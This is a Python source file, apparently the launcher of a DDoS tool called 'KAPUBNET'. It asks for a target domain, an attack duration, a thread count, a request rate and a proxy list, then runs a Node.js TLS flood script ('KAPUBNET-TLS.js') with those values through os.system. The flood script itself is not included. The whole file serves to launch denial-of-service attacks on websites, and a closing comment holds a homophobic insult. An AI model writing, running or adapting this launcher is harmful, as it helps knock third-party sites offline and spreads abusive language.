import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def bannerprint():
    print(f"\033[91m██╗  ██╗ █████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗███████╗████████╗")
    print(f"\033[31m██║ ██╔╝██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝╚══██╔══╝")
    print(f"\033[31m█████╔╝ ███████║██████╔╝██║   ██║██████╔╝██╔██╗ ██║█████╗     ██║")
    print(f"\033[31;2m██╔═██╗ ██╔══██║██╔═══╝ ██║   ██║██╔══██╗██║╚██╗██║██╔══╝     ██║   ")
    print(f"\033[31;2m██║  ██╗██║  ██║██║     ╚██████╔╝██████╔╝██║ ╚████║███████╗   ██║   ")
    print(f"\033[31;2m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝\033[0m")
    print(f"\033[95m Coded by Kapub.")
    
def getrequestcount():
    print("\033[96m[?] Choose the requests that are going to be sent per second! (Don't choose too high else it might be less effective)")

    chc = input(f"\033[38;5;208m>> ")

    request = int(chc) * 10000

    return request

def getoptions():
    target = input(f"\033[96m[?] Target Domain:\n\033[38;5;208m>> \033[0m")
    time = input(f"\033[96m[?] Time (in seconds):\n\033[38;5;208m>> \033[0m")
    thread = input(f"\033[96m[?] Thread count:\n\033[38;5;208m>> \033[0m")
    request = getrequestcount()
    proxy = input(f"\033[96m[?] Proxy (be sure proxy is in same folder/dir as the tool and is a txt file.):\n\033[38;5;208m>> \033[0m")
    return target, time, request, thread, proxy

def run(target, time, request, thread, proxy):
    os.system(f'node KAPUBNET-TLS.js {target} {time} {request} {thread} {proxy}')

def main():
    clear()
    bannerprint()
    target, time, request, thread, proxy = getoptions()
    run(target, time, request, thread, proxy)

main()

# if ur reading this ur gay as fuck. get out of here perv. - SqLoSt
